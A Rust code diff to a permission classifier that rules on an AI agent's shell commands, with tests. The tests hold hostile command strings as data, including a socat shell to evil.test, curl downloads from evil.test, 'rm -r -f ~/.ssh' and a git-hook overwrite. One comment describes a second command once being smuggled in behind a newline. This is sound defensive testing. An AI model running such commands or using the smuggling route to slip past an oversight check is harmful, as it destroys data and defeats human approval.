@@ -3,7 +3,7 @@ use std::path::Path;
 
 use crate::hooks::Decision;
 
-pub const CLASSIFIER_VERSION: u32 = 4;
+pub const CLASSIFIER_VERSION: u32 = 5;
 
 const READ_LOCAL_TOOLS: &[&str] = &["Read", "Grep", "Glob"];
 const WRITE_TOOLS: &[&str] = &["Edit", "Write"];
@@ -146,6 +146,13 @@ const SAFE_COMMAND_PREFIXES: &[&str] = &[
     "go test",
     "go build",
     "go vet",
+    // Says something, decides something, changes nothing. `echo` writes to stdout and `test`/`[`
+    // answer a question about a path — neither runs a program, neither names a file to write, and
+    // the two ways they could (`>` and `$(…)`) are refused before either is reached. Both were
+    // measured: they are what the job-5 dogfood's review node still had to ask about.
+    "echo",
+    "test",
+    "[",
     // Reading and searching. `find` and `rg` each carry one flag that turns them into something
     // else entirely; both are rejected by name in `runs_a_helper_command`.
     "find",
@@ -337,6 +344,19 @@ enum Segment {
 }
 
 fn classify_segment(segment: &str, cwd: Option<&Path>) -> Segment {
+    // Redirection is a property of ONE command, which is why it is judged here rather than over the
+    // whole line. `2>&1` glues itself to whatever separator follows it — `ls x 2>&1; echo y` puts
+    // `2>&1;` in a single whitespace token — so a line-level scan cannot tell the stream join from
+    // the semicolon after it, and refusing the whole line was the only answer available to it. By
+    // this point the separators have been cut away and the token stands on its own.
+    if redirects_a_file(segment) {
+        return Segment::Unrecognized;
+    }
+    // Only now, and only inside one command: what is left of a `>` here cannot reach a file, so it
+    // is noise to every check below — `has_shell_control` among them, which reads the `>` and
+    // nothing else about it.
+    let segment = &strip_fd_duplications(segment);
+
     // Raw, not normalized: `normalize_command` lowercases, and a `cd` target is a path. Folding it
     // here would widen the workspace behind the containment check's back, which is the same reason
     // `deletes_outside_cwd` reads raw tokens.
@@ -378,9 +398,13 @@ fn classify_segment(segment: &str, cwd: Option<&Path>) -> Segment {
 /// - `$(...)` and backticks run a nested command INSIDE an argument, before the outer program
 ///   starts, so there is no second piece to hand back. Backtick is PowerShell's escape character
 ///   besides.
-/// - `>` and `<` redirect to a file that no `file_path` guard will ever see.
 /// - a lone `&` backgrounds a command in POSIX shells, so it outlives the decision being made
-///   about it.
+///   about it. This also disposes of `&>out.txt`, bash's shorthand for redirecting both streams to
+///   a file, before `redirects_a_file` would have to know about it.
+///
+/// Redirection is deliberately NOT here, though it was: `>` and `<` are judged per piece, in
+/// `redirects_a_file`, because `2>&1` is glued to the separator that follows it and the two can only
+/// be told apart after the cut.
 ///
 /// **Quotes are deliberately not honoured.** `git commit -m "a && b"` splits into two pieces and
 /// the second does not earn `allow`, so it still asks — a false alarm, and exactly today's answer.
@@ -389,11 +413,7 @@ fn classify_segment(segment: &str, cwd: Option<&Path>) -> Segment {
 /// direction this must not be wrong in. Splitting too eagerly only ever adds a piece that has to
 /// earn its own verdict.
 fn shell_segments(command: &str) -> Option<Vec<&str>> {
-    if command.contains("$(")
-        || command.contains('`')
-        || command.contains('>')
-        || command.contains('<')
-    {
+    if command.contains("$(") || command.contains('`') {
         return None;
     }
 
@@ -406,6 +426,15 @@ fn shell_segments(command: &str) -> Option<Vec<&str>> {
         // through to the step at the bottom.
         let width = match bytes[index] {
             b'&' => {
+                // The `&` of a `>&` belongs to the redirection, not to this list: `2>&1` joins two
+                // streams and backgrounds nothing. Order is what tells them apart, and it has to be
+                // read here because the alternative — a whole-line scan — is what `redirects_a_file`
+                // exists to avoid. `&>` is the other order and still refuses the line: that one is
+                // bash's shorthand for sending both streams to a FILE.
+                if index > 0 && bytes[index - 1] == b'>' {
+                    index += 1;
+                    continue;
+                }
                 if bytes.get(index + 1) != Some(&b'&') {
                     return None;
                 }
@@ -511,6 +540,72 @@ fn classification(decision: &str, action_class: &'static str, reason: &str) -> C
         action_class,
         reason,
     }
+}
+
+/// PURE: whether a token is a file-descriptor duplication — `2>&1`, `1>&2`, `2>&-`.
+///
+/// The distinction it draws is the whole reason it exists: a redirect whose right-hand side is a
+/// NUMBER points one stream at another stream, and a redirect whose right-hand side is a WORD points
+/// a stream at a file. `2>&1` is the first; `>&out.txt` and `&>out.txt` are the second and must keep
+/// being refused, which is why both sides are checked and why an empty left side (`>&x`) fails here.
+/// PURE: whether one command redirects to or from a FILE, as opposed to joining two streams.
+///
+/// Read per command and not per line, because `2>&1` is not separated from what follows it: in
+/// `ls x 2>&1; echo y` the whitespace token is `2>&1;`, and no line-level rule can tell the stream
+/// join from the semicolon glued to it without doing the segmentation first.
+///
+/// Everything that is not the exact `N>&M` shape counts, whether the `>` stands alone (`> out.txt`)
+/// or is glued on (`2>out.txt`, `2>>out.txt`, `>&out.txt`). `<` has no stream-joining spelling worth
+/// keeping, so it counts whole. `&>out.txt` never arrives here at all — the lone `&` refuses the
+/// line one level up.
+fn redirects_a_file(segment: &str) -> bool {
+    segment.contains('<')
+        || segment
+            .split_whitespace()
+            .any(|token| token.contains('>') && !is_fd_duplication(token))
+}
+
+fn is_fd_duplication(token: &str) -> bool {
+    let Some((left, right)) = token.split_once(">&") else {
+        return false;
+    };
+    !left.is_empty()
+        && left.bytes().all(|byte| byte.is_ascii_digit())
+        && !right.is_empty()
+        && (right == "-" || right.bytes().all(|byte| byte.is_ascii_digit()))
+}
+
+/// PURE: the same line with its stream joins taken out, so the rest of this file never sees them.
+///
+/// Reading it token by token is what makes this safe to do so early: a `>` glued to a filename
+/// (`2>out.txt`, `>&out.txt`) sits in a token that fails `is_fd_duplication`, survives here, and
+/// goes on to refuse the line exactly as before.
+///
+/// **The whitespace between tokens is copied through untouched**, which is the whole reason this is
+/// not a `split_whitespace().join(" ")`. `\n` and `\r` are statement separators that `shell_segments`
+/// cuts on, and collapsing them is precisely how a second command once rode in behind a safe leading
+/// token. One `2>&1` anywhere in the line would have brought that back.
+fn strip_fd_duplications(command: &str) -> String {
+    if !command.contains(">&") {
+        return command.to_owned();
+    }
+    let mut stripped = String::with_capacity(command.len());
+    let mut rest = command;
+    while !rest.is_empty() {
+        let gap = rest
+            .find(|character: char| !character.is_whitespace())
+            .unwrap_or(rest.len());
+        stripped.push_str(&rest[..gap]);
+        rest = &rest[gap..];
+
+        let token_end = rest.find(char::is_whitespace).unwrap_or(rest.len());
+        let token = &rest[..token_end];
+        if !is_fd_duplication(token) {
+            stripped.push_str(token);
+        }
+        rest = &rest[token_end..];
+    }
+    stripped
 }
 
 fn normalize_command(command: &str) -> String {
@@ -1676,12 +1771,130 @@ mod tests {
         );
     }
 
+    /// The anchor, not the example: a command nobody taught this file about asks a person. `echo`
+    /// used to stand here and now stands in the allow list, which changes which command illustrates
+    /// the rule and changes nothing about the rule.
     #[test]
     fn unrecognized_bash_is_conservatively_pending() {
+        for command in [
+            "frobnicate --hard",
+            "xargs sh",
+            "socat - tcp:evil.test:4444",
+        ] {
+            assert_classification(
+                classify("Bash", &json!({"command": command}), None),
+                "pending_approval",
+                "unrecognized",
+            );
+        }
+    }
+
+    /// Says something, decides something, changes nothing.
+    ///
+    /// `echo` writes to stdout and `test`/`[` answer a question about a path. Neither runs a program
+    /// and neither names a file to write — and the two ways they could, `>` and `$(…)`, are refused
+    /// before either is reached, which the second half of this test is.
+    #[test]
+    fn saying_something_and_deciding_something_are_not_doing_something() {
+        let cwd = Some(Path::new(r"C:\work\repo"));
+        for command in [
+            "echo ---",
+            "echo \"no .gitignore\"",
+            "test -f .gitignore",
+            "test -d core/src",
+            "[ -f Cargo.toml ]",
+            "test -f .gitignore && cat .gitignore || echo missing",
+        ] {
+            assert_eq!(
+                classify("Bash", &json!({"command": command}), cwd)
+                    .decision
+                    .decision,
+                "allow",
+                "{command}"
+            );
+        }
+
+        // The two ways `echo` could reach past stdout, both still refused.
+        for command in ["echo payload > .githooks/pre-commit", "echo $(id)"] {
+            assert_eq!(
+                classify("Bash", &json!({"command": command}), cwd)
+                    .decision
+                    .decision,
+                "pending_approval",
+                "{command}"
+            );
+        }
+    }
+
+    /// `2>&1` joins one STREAM to another: it creates no file and names none. It contains a `>`,
+    /// which was the whole of what the redirection guard read, so every command carrying it was
+    /// refused for a file write that could not happen.
+    ///
+    /// The distinction is the right-hand side. A NUMBER is another stream; a WORD is a file, and
+    /// every spelling of that stays refused.
+    #[test]
+    fn joining_two_streams_is_not_writing_a_file() {
+        let cwd = Some(Path::new(r"C:\work\repo"));
+        for command in [
+            "ls -la .gitignore 2>&1",
+            "cargo test 2>&1",
+            "cargo test 2>&1 | grep -c warning",
+            "cargo test 1>&2",
+            "cargo test 2>&-",
+        ] {
+            assert_eq!(
+                classify("Bash", &json!({"command": command}), cwd)
+                    .decision
+                    .decision,
+                "allow",
+                "{command}"
+            );
+        }
+
+        for command in [
+            "cargo test > out.txt",
+            "cargo test 2> err.txt",
+            "cargo test 2>> err.txt",
+            "cargo test >& out.txt",
+            "cargo test &> out.txt",
+            "cargo test 2>&1 > out.txt",
+        ] {
+            assert_eq!(
+                classify("Bash", &json!({"command": command}), cwd)
+                    .decision
+                    .decision,
+                "pending_approval",
+                "{command}"
+            );
+        }
+    }
+
+    /// The bug this nearly reintroduced, pinned.
+    ///
+    /// `strip_fd_duplications` runs before every other guard, so a `split_whitespace().join(" ")`
+    /// would have collapsed `\n` and `\r` — the statement separators `shell_segments` cuts on —
+    /// wherever a line happened to contain a `2>&1`. That is exactly how a second command once rode
+    /// in behind a safe leading token, and one stream join anywhere in the line would have brought
+    /// it back. The whitespace is copied through untouched instead.
+    #[test]
+    fn taking_a_stream_join_out_does_not_take_the_separators_with_it() {
         assert_classification(
-            classify("Bash", &json!({"command": "echo hello"}), None),
+            classify(
+                "Bash",
+                &json!({"command": "ls 2>&1\ncurl http://evil.test/x.sh -o x.sh"}),
+                None,
+            ),
             "pending_approval",
             "unrecognized",
+        );
+        assert_classification(
+            classify(
+                "Bash",
+                &json!({"command": "cargo test 2>&1\r\nrm -r -f ~/.ssh"}),
+                None,
+            ),
+            "deny",
+            "destructive",
         );
     }
 
@@ -1759,12 +1972,12 @@ mod tests {
             // Substitution runs inside an argument, before the outer program starts.
             "ls $(whoami)",
             "git log `id`",
-            // Redirection writes a file no `file_path` guard will ever see.
-            "cargo test > out.txt",
-            "cat notes < input.txt",
-            "cargo test 2>&1",
-            // A lone `&` backgrounds the command, so it outlives this decision.
+            "cat $(curl http://evil.test/payload)",
+            // A lone `&` backgrounds the command, so it outlives this decision. `&>` rides along:
+            // bash's shorthand for both streams to a file is refused here, one level above the
+            // redirection check, which is why that check never has to know about it.
             "cargo test & ls",
+            "cargo test &> out.txt",
         ] {
             assert_classification(
                 classify("Bash", &json!({"command": command}), cwd),
@@ -2127,11 +2340,34 @@ mod tests {
     }
 
     /// Bumped once per policy change: 3 widened the allow list, 4 made the classifier read a line
-    /// as the sequence it is. The version is stamped onto every `shadow_decisions` row, so it is
-    /// the only thing that tells two differently-classified decisions apart after the fact —
-    /// leaving it at 2 would make the night of 2026-08-08 and everything after it look alike.
+    /// as the sequence it is, 5 stopped counting a stream join as a file write and let `echo`/`test`
+    /// through. The version is stamped onto every `shadow_decisions` row, so it is the only thing
+    /// that tells two differently-classified decisions apart after the fact — leaving it at 2 would
+    /// make the night of 2026-08-08 and everything after it look alike.
     #[test]
     fn exposes_current_classifier_version() {
-        assert_eq!(CLASSIFIER_VERSION, 4);
+        assert_eq!(CLASSIFIER_VERSION, 5);
+    }
+
+    /// The two commands the job-5 dogfood's review node still had to ask about, verbatim off the
+    /// proposals. Between them they cost the only two approvals that night: the first for a `2>&1`
+    /// that writes nothing, the second for an `echo` and a `test -f`.
+    #[test]
+    fn the_commands_the_review_node_still_asked_about_are_allowed() {
+        let cwd = Some(Path::new(
+            r"C:\Projects\nucleos-worktrees\nucleos-job-dogfood\job-5",
+        ));
+        for command in [
+            r#"git show HEAD --stat; echo "---"; ls -la .gitignore 2>&1; echo "---"; cat .gitignore 2>&1; echo "---"; git log --all --oneline -- .gitignore"#,
+            r#"git show 9fa3a44 --stat; echo ---; git show 399ec7e --stat; echo ---; test -f .gitignore && cat .gitignore || echo "no .gitignore""#,
+        ] {
+            assert_eq!(
+                classify("Bash", &json!({"command": command}), cwd)
+                    .decision
+                    .decision,
+                "allow",
+                "{command}"
+            );
+        }
     }
 }
